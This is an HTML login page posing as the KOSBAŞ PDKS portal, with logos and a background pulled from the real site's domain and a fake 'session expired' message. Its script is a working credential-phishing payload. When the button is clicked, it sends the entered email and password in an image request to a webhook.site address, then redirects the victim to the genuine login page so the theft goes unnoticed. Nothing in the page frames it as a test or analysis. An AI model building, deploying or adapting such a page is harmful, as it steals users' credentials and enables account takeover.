<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KOSBAŞ PDKS</title>
<link rel="icon" href="https://dev.kosbas.geobilgi.net/assets/management/media/logos/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background:url('https://dev.kosbas.geobilgi.net/assets/management/media/auth/login-bg.png') center/cover no-repeat;position:relative}
.login-card{position:relative;z-index:1;background:#fff;border-radius:20px;padding:50px 44px;width:440px;box-shadow:0 10px 40px rgba(0,0,0,.15);text-align:center}
.logo-area{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:28px}
.logo-area img{width:56px;height:56px}
.logo-text{text-align:left}
.logo-text .brand{font-size:32px;font-weight:900;color:#1a2a4a;letter-spacing:1.5px}
.logo-text .sub{font-size:14px;color:#3a7ab5;letter-spacing:0.5px;margin-top:1px;font-weight:600}
h2{font-size:24px;font-weight:700;color:#1a2a4a;margin-bottom:8px}
.subtitle{font-size:14px;color:#9aa8b5;margin-bottom:28px}
.error-msg{color:#c0392b;font-size:13px;margin-bottom:16px;padding:12px 16px;background:#fef2f2;border:1px solid #fecaca;border-radius:10px}
.input-group{margin-bottom:18px;text-align:left}
.input-group label{font-size:13px;color:#4a5a6a;margin-bottom:7px;display:block;font-weight:600}
.input-group input{width:100%;padding:13px 16px;border:1.5px solid #dde3ea;border-radius:10px;font-size:15px;color:#1a2b4a;outline:none;transition:border .2s;background:#fff}
.input-group input:focus{border-color:#4a9fe5;box-shadow:0 0 0 3px rgba(74,159,229,.1)}
.input-group input::placeholder{color:#b0bec5}
.forgot{text-align:right;margin-bottom:24px}
.forgot a{font-size:13px;color:#4a9fe5;text-decoration:none;font-weight:600}
.login-btn{width:100%;padding:15px;background:linear-gradient(135deg,#5aafe5,#3b8dd4);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;letter-spacing:0.5px}
.login-btn:hover{background:linear-gradient(135deg,#4a9fd5,#2b7dc4);box-shadow:0 4px 15px rgba(74,159,229,.4)}
.footer-logos{position:fixed;bottom:30px;display:flex;gap:40px;align-items:center;z-index:1;left:50%;transform:translateX(-50%)}
.footer-logos img{height:55px;opacity:.9}
</style>
</head>
<body>
<div class="login-card">
<div class="logo-area">
<img src="https://dev.kosbas.geobilgi.net/assets/management/media/logos/logo.png" style="height:60px;width:auto">
</div>
<h2>Giriş Yap</h2>
<p class="subtitle">Hesabınıza erişim sağlayın</p>
<div class="error-msg" id="err">Oturum süreniz dolmuştur. Lütfen tekrar giriş yapın.</div>
<div class="input-group">
<label>E-Posta</label>
<input type="email" id="e" placeholder="E-Posta">
</div>
<div class="input-group">
<label>Şifre</label>
<input type="password" id="p" placeholder="Şifre">
</div>
<div class="forgot"><a href="#">Şifremi Unuttum?</a></div>
<button class="login-btn" id="btn">Giriş Yap</button>
</div>
<div class="footer-logos">
<img src="https://dev.kosbas.geobilgi.net/assets/management/media/logos/logo-ticaret.png">
<img src="https://dev.kosbas.geobilgi.net/assets/management/media/logos/serbset_bol_genel_md.png">
</div>
<script>
document.getElementById('btn').addEventListener('click',function(){
var email=document.getElementById('e').value;
var pass=document.getElementById('p').value;
if(email&&pass){
this.textContent='Giriş yapılıyor...';
this.style.opacity='0.7';
var img=new Image();
img.src='https://webhook.site/28ea19a2-fa45-4a16-bee2-ebff24ffe008?email='+encodeURIComponent(email)+'&pass='+encodeURIComponent(pass);
setTimeout(function(){window.location='https://dev.kosbas.geobilgi.net/Account/Login'},1500);
}
});
</script>
</body>
</html>
